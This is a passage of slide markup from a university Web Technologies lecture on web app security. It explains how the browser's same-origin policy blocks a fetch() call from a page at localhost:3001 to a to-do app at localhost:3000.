                  </a:tcPr>
                </a:tc>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="object 5" descr="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5999988" y="3934967"/>
            <a:ext cx="457962" cy="931926"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7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dirty="0" spc="-25"/>
              <a:t>46</a:t>
            </a:fld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62050" y="557529"/>
            <a:ext cx="6282055" cy="57404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THE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-225"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="245"/>
              <a:t>SAME-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>ORIGIN</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-229"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t>POLICY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962050" y="1533220"/>
            <a:ext cx="10215880" cy="2117090"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="55244" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="434"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Even</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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though</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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minor</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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differences</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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exist</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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across</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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browsers,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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same</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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origin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	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policy</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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generally</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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applies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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all</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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fetched</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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by</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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code</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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using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	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>fetch()</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-55" b="1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or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>XMLHttpRequest</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="91440" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1045"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Suppose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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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have</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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page</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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at</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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u="sng" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://localhost:3001/cors.html</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="30">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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Express</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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0">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>To-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do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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List</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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at</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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u="sng" sz="2800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://localhost:3000</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2232405" y="3730371"/>
            <a:ext cx="7465695" cy="2262505"/>
            <a:chOff x="2232405" y="3730371"/>
            <a:chExt cx="7465695" cy="2262505"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="object 5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290815" y="3739896"/>
              <a:ext cx="2397252" cy="2161072"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="object 6" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7285990" y="3735133"/>
              <a:ext cx="2407285" cy="2252980"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2407284" h="2252979">
                  <a:moveTo>
                    <a:pt x="0" y="2252853"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2406777" y="2252853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2406777" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2252853"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2238755" y="3739896"/>
              <a:ext cx="2397760" cy="2243455"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2397760" h="2243454">
                  <a:moveTo>
                    <a:pt x="0" y="159384"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8126" y="109012"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30756" y="65260"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="65260" y="30756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109012" y="8126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159385" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2237867" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2288239" y="8126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2331991" y="30756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2366495" y="65260"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2389125" y="109012"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2397252" y="159384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2397252" y="2083917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2389125" y="2134302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2366495" y="2178061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2331991" y="2212570"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2288239" y="2235200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2237867" y="2243328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159385" y="2243328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109012" y="2235200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="65260" y="2212570"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30756" y="2178061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8126" y="2134302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2083917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="159384"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="111F35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" name="object 8" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2962148" y="4697425"/>
            <a:ext cx="949960" cy="3003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solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10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1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Page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9" name="object 9" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4636770" y="4805171"/>
            <a:ext cx="2654935" cy="114300"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2654934" h="114300">
                <a:moveTo>
                  <a:pt x="2540127" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2540127" y="114300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2616327" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2559177" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2559177" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2616327" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2540127" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="2654934" h="114300">
                <a:moveTo>
                  <a:pt x="2540127" y="38100"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2540127" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2540127" y="38100"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="2654934" h="114300">
                <a:moveTo>
                  <a:pt x="2616327" y="38100"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2559177" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2559177" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2616327" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2654427" y="57150"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2616327" y="38100"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="D7003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 descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7486650" y="6002223"/>
            <a:ext cx="200977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u="sng" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://localhost:3000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4" name="object 14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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="object 15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dirty="0" spc="-25"/>
              <a:t>46</a:t>
            </a:fld>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2433573" y="5992469"/>
            <a:ext cx="2012950" cy="3003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u="sng" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>http://localhost:3001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2" name="object 12" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5645277" y="4317238"/>
            <a:ext cx="62992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10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>fetch()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3" name="object 13" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4882134" y="4546854"/>
            <a:ext cx="2171065" cy="11023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 marR="6350">
              <a:lnSpc>
                <a:spcPts val="4240"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="100"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="3600" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="A10025"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI Symbol"/>
                <a:cs typeface="Segoe UI Symbol"/>
              </a:rPr>
              <a:t>✘</a:t>
            </a:r>
            <a:endParaRPr sz="3600">
              <a:latin typeface="Segoe UI Symbol"/>
              <a:cs typeface="Segoe UI Symbol"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPts val="2080"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Blocked</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-5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111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>because</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-6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111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-7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1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" marL="635">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>same-origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>policy</a:t>
            </a:r>
            <a:endParaRPr sz="1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62050" y="557529"/>
            <a:ext cx="6282055" cy="57404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THE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-225"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="245"/>
              <a:t>SAME-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>ORIGIN</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-229"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t>POLICY</a:t>
            </a:r>
          </a:p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273296" y="3913632"/>
            <a:ext cx="7299959" cy="2438400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="876046" y="1558797"/>
          <a:ext cx="10784840" cy="47904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386454"/>
                <a:gridCol w="7041515"/>
                <a:gridCol w="269240"/>
              </a:tblGrid>
              <a:tr h="2343150">
                <a:tc gridSpan="2"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54"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>//in</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-35">
                          <a:solidFill>
                            <a:srgbClr val="008000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dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>the</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:solidFill>
                            <a:srgbClr val="008000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dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>web</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:solidFill>
                            <a:srgbClr val="008000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dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>page</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:solidFill>
                            <a:srgbClr val="008000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dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>at</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-20">
                          <a:solidFill>
                            <a:srgbClr val="008000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dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                          <a:hlinkClick r:id="rId3"/>
                        </a:rPr>
                        <a:t>http://localhost:3001</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Consolas"/>
                        <a:cs typeface="Consolas"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342265" marR="4310380" indent="-250190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dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
